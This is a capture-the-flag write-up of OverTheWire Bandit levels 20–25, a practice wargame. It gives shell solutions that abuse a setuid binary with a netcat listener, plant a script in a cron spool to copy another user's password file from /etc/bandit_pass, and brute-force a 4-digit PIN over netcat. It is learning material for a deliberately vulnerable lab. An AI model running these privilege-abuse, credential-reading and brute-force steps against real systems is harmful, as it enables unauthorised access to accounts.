# Bandit CTF Writeups: Levels 20 to 25

**Host:** `bandit.labs.overthewire.org`  
**Port:** `2220`

---

# Bandit Level 20 → 21

## Goal
Use a setuid binary `suconnect` that connects to a port you specify, reads a password, and if it matches bandit20's password, sends back bandit21's password.

## Solution

```bash
echo "bandit20_password" | nc -l -p 4444 &
./suconnect 4444
```

---

# Bandit Level 21 → 22

## Goal
A cron job runs periodically as bandit22. Find what it does and use it to get the password.

## Solution

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

---

# Bandit Level 22 → 23

## Goal
A cron job runs as bandit23 and writes the password to a `/tmp` file named after an md5 hash. Figure out the filename and read it.

## Solution

```bash
cat /usr/bin/cronjob_bandit23.sh
mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
echo $mytarget
cat /tmp/$mytarget
```

---

# Bandit Level 23 → 24

## Goal
A cron job runs as bandit24 and executes then deletes any script in `/var/spool/bandit24/foo` owned by bandit23. Write a script that copies the password out.

## Solution

```bash
cat /usr/bin/cronjob_bandit24.sh

mktemp -d
chmod 777 /tmp/tmp.XXXXXX
cd /tmp/tmp.XXXXXX

nano test.sh
```

Contents of `test.sh`:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXX/pwd24.txt
```

```bash
chmod +x test.sh
cp test.sh /var/spool/bandit24/foo
cat /tmp/tmp.XXXXXX/pwd24.txt
```

---

# Bandit Level 24 → 25

## Goal
A daemon on port 30002 requires the bandit24 password plus a secret 4-digit PIN (0000–9999). Brute-force all 10000 combinations to find the correct one.

## Solution

```bash
for i in {0000..9999}; do
    echo "bandit24_password $i"
done | nc localhost 30002 | grep -vi "wrong"
```

---
